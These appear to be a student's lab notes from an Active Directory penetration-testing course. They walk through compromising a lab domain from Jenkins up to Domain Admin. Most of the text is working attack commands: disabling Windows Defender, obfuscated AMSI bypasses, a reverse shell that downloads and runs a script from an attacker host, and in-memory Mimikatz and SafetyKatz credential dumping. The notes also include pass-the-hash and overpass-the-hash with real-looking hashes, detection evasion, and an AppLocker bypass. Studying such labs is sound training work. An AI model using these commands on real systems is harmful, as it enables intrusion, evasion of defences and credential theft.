# Antivirus & Detections

## Windows Defender

### Check Status of Defender

- **PowerShell Commands:**
  ```powershell
  Get-MpComputerStatus
  ```

- **Firewall Status Commands:**
  ```powershell
  netsh advfirewall show domain
  netsh advfirewall show private
  netsh advfirewall show public
  ```

### Disable Real-Time Monitoring

- **PowerShell Command:**
  ```powershell
  Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
  ```

- **Disable IOAV Protection:**
  ```powershell
  Set-MpPreference -DisableIOAVProtection $true
  ```

---

# PowerShell Remoting (PS-Remoting)

## Ports
- Port number for WSMan or WinRM is 5981.
- Port number for SSL is 5986.
- PowerShell remoting port 5985 is the default for HTTP and HTTPS.

## Types of PowerShell Remoting
1. One to One
2. One to Many

# One to Many - New PSSession

## Create a New PSSession and Enter It
```powershell
PS C:\AD\Tools> $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
PS C:\AD\Tools> $sess

 Id Name        ComputerName        ComputerType     State      ConfigurationName    Availability
 -- ----        ------------        ------------     -----      -----------------    ------------
  1 Session1    dcorp-adminsrv      RemoteMachine    Opened     Microsoft.PowerShell Available

PS C:\AD\Tools> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> $proc = Get-Process
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> exit
PS C:\AD\Tools> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> $proc
```

# One to One - Enter-PSSession
- Interactive
- Runs in a new process (`wsmprovhost`)
- Is Stateful

## Enter a PSSession
```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> whoami /priv

enter-pssession -computername ad -credential domain-lab\Administrator
```

# Script Execution

## Invoke-Command | Function Load | File Load

### Execute Scripts
```powershell
PS C:\AD\Tools> Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
PS C:\AD\Tools> Invoke-Command -ComputerName (Get-Content .\computers.txt) -ScriptBlock {whoami;hostname}
```

### Execute Functions
```powershell
PS C:\Users\student157\Desktop> hello
PS C:\Users\student157\Desktop> Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock ${function:hello}
PS C:\Users\student157\Desktop> cat .\hello.ps1

function hello {
    Write-Host "Hello World! from function"
}
```

### Execute File
```powershell
PS C:\Users\student157\Desktop> $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
PS C:\Users\student157\Desktop> Invoke-Command -FilePath C:\Users\student157\Desktop\hello.ps1 -Session $sess
PS C:\Users\student157\Desktop> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> hello
```

# Language Mode

## Constrained
- Default cmdlets only work in PowerShell.
- .NET classes and type accelerators are not available.
- Configured in AppLocker.

### Check Language Mode in Constrained Environment
```powershell
PS C:\AD\Tools> Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
```

## Full
### Check Language Mode in Full Environment
```powershell
PS C:\Users\Lenovo> $ExecutionContext.SessionState.LanguageMode
```

## Passing Arguments in Invoke-Command
Only positional arguments could be passed this way.
```powershell
Invoke-Command -ScriptBlock ${function:GetPassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

This format should make the commands more organized and easier to read and paste into GitHub!
```



## AppLocker Enumeration

### With the GPO

- Registry Key Location: 
  ```
  HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2
  ```
  - Keys: `Appx`, `Dll`, `Exe`, `Msi`, and `Script`.

### List AppLocker Rules

- **PowerShell Command:**
  ```powershell
  $a = Get-ApplockerPolicy -effective
  $a.rulecollections
  ```

---

## PowerShell

### Default PowerShell Locations in a Windows System

- `C:\windows\syswow64\windowspowershell\v1.0\powershell`
- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell`

### Example of AMSI Bypass

- **PowerShell Command:**
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
  ```

---

## Default Writeable Folders
```
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Tasks`
- `C:\windows\tracing`
```

# Jenkins Shell Compromise

## Reverse Shell from Jenkins
```powershell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.157/re_shell.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.157 -Port 443
```

## Bypass Anti-Virus
```powershell
sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx') ([TYpE]("{1}{0}" -f 'F','rE'));(GeT-VariaBle("1Q2U"+"zX") -VaL).""A`ss`Embly"".""GET`TY`Pe""((""{6}{3}{1}{4}{2}{0}{5}"" -f'Util','A','Amsi','.Management.','utomation.','s','System')).""g`etf`iElD""(("{0}{2}{1}" -f 'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,')).""sE`T`VaLUE""(${n`ULl},${t`RuE})
```

## Load PowerView Module in Memory
```powershell
iex (iwr http://172.16.100.157/PowerView.ps1 -UseBasicParsing)
```

## Verify with PowerView Command
```powershell
get-help Invoke-UserHunter
```

## Execute Commands on Remote Machine
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
PS C:\Program Files (x86)\Jenkins\workspace\project0> whoami
```

## Load Mimikatz and Dump Hashes
```powershell
iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

## Create a New PSSession
```powershell
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# Active Session and Dump Hashes

## Check Access and Dump Hashes
```powershell
Invoke-UserHunter -checkaccess
Find-LocalAdminAccess
```

# Confirm Local Admin Privileges
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# Dump Hashes Using Mimikatz
```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

mimikatz(powershell) # sekurlsa::logonpasswords
```

## Pass-the-Hash with Mimikatz
```powershell
Invoke-Mimikatz -Command '""sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe""'
```
# Learning Objective 7: 

## Task 

• Identify a machine in the target domain where a Domain Admin session is available.  
• Compromise the machine and escalate privileges to Domain Admin 
  − Using access to dcorp-ci 
  − Using derivative local admin 

**Solution**
We have access to two domain users - studentx and ciadmin and administrative access to dcorpadminsrv machine. User hunting has not been fruitful as studentx.  

## Enumeration using Invoke-SessionHunter:

We can use Invoke-SessionHunter.ps1 from the student VM to list sessions on all the remote machines. The script connects to Remtoe Registry service on remote machines that runs by default. Also, admin access is not required on the remote machines.  Use the following commands:
```
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
```
![image](https://github.com/user-attachments/assets/dd66cd99-aced-4d71-9f35-f468d2274ff7)

To make the above enumeration more opsec friendly and avoid triggering tools like MDI, we can query specific target machines. You need to create ‘servers.txt’ to use the below command: 

![image](https://github.com/user-attachments/assets/92984b3a-acdb-4cfa-9469-77e706683b40)

## Enumeration using PowerView:
We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.  

We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging.  

First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial download-execute cradle that we used in Jenkins.  

The below command bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the download-exec cradle. Remember to host the sbloggingbypass.txt on a web server on the student VM if you use the download-exec cradle : 

```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/InvokePowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
**PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)** 
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
PS C:\Users\Administrator\.jenkins\workspace\Projectx> FindDomainUserLocation
```
Use the below command to bypass AMSI: 

```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
Now, download and execute PowerView in memory of the reverse shell and run FindDomainUserLocation. Note that, Find-DomainUserLocation may take many minutes to check all the machines in the domain: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
PS C:\Users\Administrator\.jenkins\workspace\Projectx> FindDomainUserLocation
```
## Abuse using winrs 
Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> winrs -r:dcorp-mgmt cmd /c "set computername && set username" 
COMPUTERNAME=DCORP-MGMT 
USERNAME=ciadmin 
```
We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.  

Run the following command on the reverse shell: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx>iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe 
```
Now, copy the Loader.exe to dcorp-mgmt: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe  

Does \\dcorp-mgmt\C$\Users\Public\Loader.exe specify a file name or directory name on the target (F = file, D = directory)? F 
C:\Users\Public\Loader.exe 1 File(s) copied 
```
Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> $null | winrs r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
Please note that we must use the $null variable to address output redirection issues.  Note that Windows Defender on dcorp-mgmt would detect SafetKatz execution even when used with Loader. To avoid that, let’s pass encoded arguments to the Loader.  First, run the below command on the student VM to generate encoded arguments for “sekurlsa::ekeys “(not required to be run on the reverse shell): 

![image](https://github.com/user-attachments/assets/8880bffd-d0dc-42a3-838c-3e8ed1f800a8)

Include the above output and other arguments in a batch file. Below are the contents of the batch file. It is also present in the C:\AD\Tools directory of our student VM as **Safety.bat** 

![image](https://github.com/user-attachments/assets/18b98ae6-6e41-479b-be88-610674d4ca99)

Download the batch file on dcorp-ci. Run the below commands on the reverse shell: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx>iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat 
```
Now, copy the Safety.bat to dcorp-mgmt: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat 
```
![image](https://github.com/user-attachments/assets/117b1f00-3659-4a03-a809-5cf73c923546)

Run Safety.bat on dcorp-mgmt that use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> $null | winrs r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat"
```
![image](https://github.com/user-attachments/assets/9be372da-6c1e-4547-9965-ba7d4ae568c3)

Sweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see "Session" in the above output), so you can even get credentials in clear-text from lsasecrets!

## Abuse using PowerShell Remoting
Check if we can run commands on dcorp-mgmt using PowerShell remoting.  
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> Invoke-Command ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt 
ciadmin 
dcorp-mgmt 
```
Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin "svcadmin". Host Invoke-Mimi.ps1 on your studentx machine and run the below command on the reverse shell: 
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
```
Now, to use Invoke-Mimi on dcorp-mgmt, we must disable AMSI there. Please note that we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt: 

![image](https://github.com/user-attachments/assets/620c0b20-6e2e-4500-b370-1534fcf527e8)

## Using OverPass-the-Hash

Finally, use OverPass-the-Hash to use svcadmin's credentials.
Run the below command from an elevated shell from the student VM. Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.)  
Run the below commands from an elevated shell on the student VM to use Rubeus. Note that we are passing encoded arguments to Loader to avoid detection: 

```
C:\Windows\system32>C:\AD\Tools\ArgSplit.bat
```
![image](https://github.com/user-attachments/assets/7e922474-3a67-4e8d-be3c-52f63b93a5ea)

Run the above commands in the same command prompt session. Note that if you get an error like 'This app can't run on your PC' for Loader.exe or Rubeus.exe, re-extract from C:\AD\Tools.zip: 

```
C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Try accessing the domain controller from the new process! 
```
C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
```
Note that we did not need to have direct access to dcorp-mgmt from student machine 100.X. 

# Derivative Local Admin

Now moving on to the next task, we need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges. On a PowerShell session started using Invisi-Shell, enter the following command. 
```
PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess dcorp-adminsrv [snip] 
```

![image](https://github.com/user-attachments/assets/0e10ea8b-520c-4364-9ceb-8c9e08bc27ac)

We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error  'This program is blocked by group policy. For more information, contact your system administrator'. Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode. This could be because of an application allowlist on dcorp-adminsrv and we drop into a Constrained Language Mode (CLM) when using PSRemoting. 

Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute: 
```
C:\AD\Tools>winrs -r:dcorp-adminsrv cmd 
Microsoft Windows [Version 10.0.20348.1249] 
(c) Microsoft Corporation. All rights reserved. 
C:\Users\studentx>reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 
```
![image](https://github.com/user-attachments/assets/f4c5c8e4-d33a-4aa4-9a81-115216ab1bd4)

ooks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive! 

![image](https://github.com/user-attachments/assets/ac4cff68-a674-4ad2-91a6-a51324bfcb29)

A default rule is enabled that allows everyone to run scripts from the C:\ProgramFiles folder!  
We can also confirm this using PowerShell commands on dcrop-adminsrv. Run the below commands from a PowerShell session as studentx: 

![image](https://github.com/user-attachments/assets/51e5561f-bc8f-40a9-8e57-5ca9948d3631)

Here, Everyone can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them. But we first need to disable Windows Defender on the  dcorp-adminsrv server: 

```
[dcorp-adminsrv]: PS C:\Users\studentx\Documents> Set-MpPreference DisableRealtimeMonitoring $true -Verbose 
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
```
Also, we cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1) because of the Constrained Language Mode. So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.  

Create Invoke-MimiEx.ps1 
- Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.  
- Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).  
- Add "Invoke-Mimi -Command '"sekurlsa::ekeys"' " (without quotes) to the end of the file.

On student machine run the following command from a PowerShell session
```
PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files' 
```
The file Invoke-MimiEx.ps1 is copied to the dcorp-adminsrv server. 

![image](https://github.com/user-attachments/assets/1ea8bbff-3386-46ea-8924-60d2b25fe031)

Now run the modified mimikatz script. Note that there is no dot sourcing here: 

[dcorp-adminsrv]: PS C:\Program Files> .\Invoke-MimiEx.ps1 

Here we find the credentials of the srvadmin, appadmin and websvc users.  

From local system with elevated shell (Run as Administrator), use asktgt from Rubeus with Loader.exe and encoded arguments: 

![image](https://github.com/user-attachments/assets/27f9a7f4-5a6c-479f-a23e-ff5bdd084ae0)

The new process that starts has srvadmin privileges. Check if srvadmin has admin privileges on any other machine. 

![image](https://github.com/user-attachments/assets/e97fa3e4-5a62-433f-93fc-f3622e738eeb)

We have local admin access on the dcorp-mgmt server as srvadmin and we already know a session of svcadmin is present on that machine.  

SafetyKatz for extracting credentials 

Let's use SafetyKatz to extract credentials from the machine. Run the below commands from the process running as srvadmin. 

Copy the Loader.exe and Safety.bat to dcorp-mgmt: 

![image](https://github.com/user-attachments/assets/26f1bf5b-45ff-477d-9f18-4ee1cba25ef5)

Extract credentials: 

C:\Windows\system32> winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"  

C:\Windows\system32>winrs -r:dcorp-mgmt C:\Users\Public\Safety.bat 

Invoke-Mimi for extracting credentials 
We could also use Invoke-Mimi with PSRemoting. Take a session to dcorp-mgmt with PSRemoting. 

![image](https://github.com/user-attachments/assets/f0214471-f349-46e1-b053-25cbc54bbb35)

![image](https://github.com/user-attachments/assets/509e4d16-9def-4668-9ed3-654bbc1344fd)

Invoke-Mimi for extracting credentials from credentials vault
We can also look for credentials from the credentials vault. Interesting credentials like those used for scheduled tasks are stored in the credential vault. Use the below command: 

![image](https://github.com/user-attachments/assets/2a8b0a89-a541-4bb9-8159-1b5a906c450c)

Finally, we can use the svcadmin credentials on the student VM using OverPass-the-hash 
```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%/user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
The new process starts with the privileges of svcadmin!  




















